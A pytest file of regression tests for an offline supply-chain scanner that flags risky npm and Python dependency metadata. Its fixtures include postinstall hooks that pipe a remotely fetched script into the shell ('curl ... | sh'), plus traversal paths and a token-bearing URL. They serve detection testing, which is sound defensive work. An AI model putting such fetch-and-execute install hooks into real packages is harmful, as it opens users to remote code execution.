"""Adversarial regression tests for offline ChainBrain supply-chain assessment."""
import hashlib
import json
from pathlib import Path

import pytest

from app.analysis.chainbrain import analyze_supply_chain_repository
from app.ingestion.schemas import AnalysisScope, FileEntry, RepositoryManifest
from app.schemas.enums import Severity


def _scan(root: Path, entries: dict[str, str], *, truncated=False):
    files = []
    for path, content in entries.items():
        target = root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
        files.append(FileEntry(
            path=path, language="json", size_bytes=len(content.encode()),
            lines_count=len(content.splitlines()),
            content_sha256=hashlib.sha256(content.encode()).hexdigest(),
        ))
    manifest = RepositoryManifest(
        repository_url="https://github.com/owner/repo",
        commit_hash="a" * 40,
        files=files, total_files=len(files),
        analysis_scope=AnalysisScope(truncated=truncated, reason="test" if truncated else None),
    )
    return analyze_supply_chain_repository(str(root), manifest)


def test_chainbrain_risky_install_hook_is_detected_without_execution(tmp_path):
    package = json.dumps({
        "name": "suspect-pkg",
        "scripts": {
            "postinstall": "curl https://example.org/bootstrap.sh | sh",
        },
    })
    result = _scan(tmp_path, {"package.json": package})
    assert result.status.value == "COMPLETED"
    assert {f.rule_id for f in result.findings} == {"CB-NPM-001"}
    finding = result.findings[0]
    assert finding.severity == Severity.HIGH
    assert finding.category == "dependency"
    assert finding.evidence.file_path == "package.json"
    assert finding.raw_details["risk_score_kind"] == "heuristic_not_probability"
    assert finding.raw_details["maintainer_reputation"] == "not_evaluated"
    assert finding.description and "malicious" not in finding.title.lower()


def test_chainbrain_install_script_source_detected_without_running(tmp_path):
    package = json.dumps({
        "name": "suspect-pkg",
        "scripts": {"postinstall": "node scripts/bootstrap.js"},
    })
    script = 'const x = "curl https://example.com/setup.sh | sh";\n'
    result = _scan(tmp_path, {
        "package.json": package,
        "scripts/bootstrap.js": script,
    })
    assert result.status.value == "COMPLETED"
    assert "CB-CODE-001" in [f.rule_id for f in result.findings]


def test_chainbrain_npm_dependency_lockfile_detects_provenance_risks(tmp_path):
    lock = json.dumps({
        "lockfileVersion": 3,
        "packages": {
            "": {"name": "demo"},
            "node_modules/unsafe": {
                "version": "1.0.0",
                "resolved": "http://registry.npmjs.org/unsafe/-/unsafe-1.0.0.tgz",
                "hasInstallScript": True,
            },
            "node_modules/other": {
                "version": "2.0.0",
                "resolved": "https://mirror.example.com/other.tgz",
            },
        },
    })
    result = _scan(tmp_path, {"package-lock.json": lock})
    assert result.status.value == "COMPLETED"
    assert {(f.rule_id, f.raw_details["package"]) for f in result.findings} == {
        ("CB-NPM-004", "unsafe"), ("CB-NPM-005", "unsafe"),
        ("CB-NPM-006", "unsafe"), ("CB-NPM-005", "other"),
        ("CB-NPM-007", "other"),
    }


def test_chainbrain_clean_lockfile_does_not_invent_findings(tmp_path):
    lock = json.dumps({
        "lockfileVersion": 3,
        "packages": {
            "": {"name": "demo"},
            "node_modules/safe": {
                "version": "2.0.0",
                "resolved": "https://registry.npmjs.org/safe/-/safe-2.0.0.tgz",
                "integrity": "sha512-" + "x" * 60,
            },
        },
    })
    package = json.dumps({
        "name": "demo", "dependencies": {"safe": "^2.0.0"},
        "scripts": {"test": "node tests/test.js", "build": "tsc"},
    })
    result = _scan(tmp_path, {"package.json": package, "package-lock.json": lock})
    assert result.status.value == "COMPLETED"
    assert result.findings == []


def test_chainbrain_python_exact_pin_is_quiet_range_is_not(tmp_path):
    result = _scan(tmp_path, {
        "requirements.txt": "requests==2.33.0\nhttpx>=0.25\n",
        "pyproject.toml": '[project]\nname = "demo"\ndependencies = ["pydantic==2.11.0", "fastapi>=0.115"]\n',
    })
    assert result.status.value == "COMPLETED"
    assert {(f.rule_id, f.raw_details["package"]) for f in result.findings} == {
        ("CB-PY-001", "httpx"), ("CB-PY-001", "fastapi"),
    }


def test_chainbrain_missing_metadata_is_not_interpreted_as_clean(tmp_path):
    for value in ("{not-json", json.dumps({"lockfileVersion": 1, "dependencies": {}})):
        result = _scan(tmp_path, {"package-lock.json": value})
        assert result.status.value == "INVALID_OUTPUT"
        assert result.findings == []
    partial = _scan(tmp_path, {"package.json": '{"name":"safe"}'}, truncated=True)
    assert partial.status.value == "INVALID_OUTPUT"


def test_chainbrain_metadata_bytes_and_sha_are_bounded(tmp_path):
    huge = json.dumps({"name": "a", "x": "A" * (1_048_576 + 1)})
    assert _scan(tmp_path, {"package.json": huge}).status.value == "INVALID_OUTPUT"
    clean = json.dumps({"name": "demo", "scripts": {}})
    result = _scan(tmp_path, {"package.json": clean})
    assert result.status.value == "COMPLETED"
    (tmp_path / "package.json").write_text(clean + "\n", encoding="utf-8")
    from app.analysis.chainbrain import _safe_read, ChainBrainInputError
    with pytest.raises(ChainBrainInputError):
        _safe_read(str(tmp_path), "package.json", hashlib.sha256(clean.encode()).hexdigest())


def test_chainbrain_never_reads_symlink_or_parent_traversal(tmp_path):
    from app.analysis.chainbrain import _safe_read, ChainBrainInputError

    outside = tmp_path / "outside"
    outside.write_text("SENSITIVE_CANARY", encoding="utf-8")
    root = tmp_path / "root"
    root.mkdir()
    try:
        (root / "package.json").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("File symlinks are unavailable")
    with pytest.raises(ChainBrainInputError):
        _safe_read(str(root), "package.json", None)
    with pytest.raises(ChainBrainInputError):
        _safe_read(str(root), "../outside", None)


def test_chainbrain_credential_bearing_urls_never_appear_in_findings(tmp_path):
    secret = "TOKEN_MUST_NOT_APPEAR_1234"
    lock = json.dumps({
        "lockfileVersion": 3,
        "packages": {
            "node_modules/mystery": {
                "resolved": "http://account:" + secret + "@other.example/pkg.tgz",
            },
        },
    })
    result = _scan(tmp_path, {"package-lock.json": lock})
    assert result.status.value == "COMPLETED"
    assert "CB-NPM-004" in {f.rule_id for f in result.findings}
    assert secret not in str(result.model_dump())


def test_chainbrain_bounded_package_graph_and_no_untrusted_network(tmp_path, monkeypatch):
    from app.analysis import chainbrain

    def no_network(*args, **kwargs):
        raise AssertionError("Network must not be accessed")

    monkeypatch.setattr(chainbrain, "MAX_PACKAGES", 2)
    lock = json.dumps({
        "lockfileVersion": 3,
        "packages": {"": {}, "node_modules/one": {}, "node_modules/two": {}},
    })
    result = _scan(tmp_path, {"package-lock.json": lock})
    assert result.status.value == "INVALID_OUTPUT"


@pytest.mark.asyncio
async def test_chainbrain_signals_flow_into_evidence_store(tmp_path):
    from app.analysis.service import RepositoryIntelligenceService

    (tmp_path / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"postinstall": "curl https://example.com/x | sh"}}),
        encoding="utf-8",
    )
    service = RepositoryIntelligenceService(scanner_adapters=[])
    store = await service.analyze_repository(
        repo_dir=str(tmp_path), repository_url="https://github.com/owner/repo",
        commit_hash="a" * 40,
    )
    assert store.scanner_results["chainbrain"].status.value == "COMPLETED"
    assert any(f.tool == "chainbrain" for f in store.all_findings)
    assert store.get_summary()["findings_by_tool"]["chainbrain"] >= 1
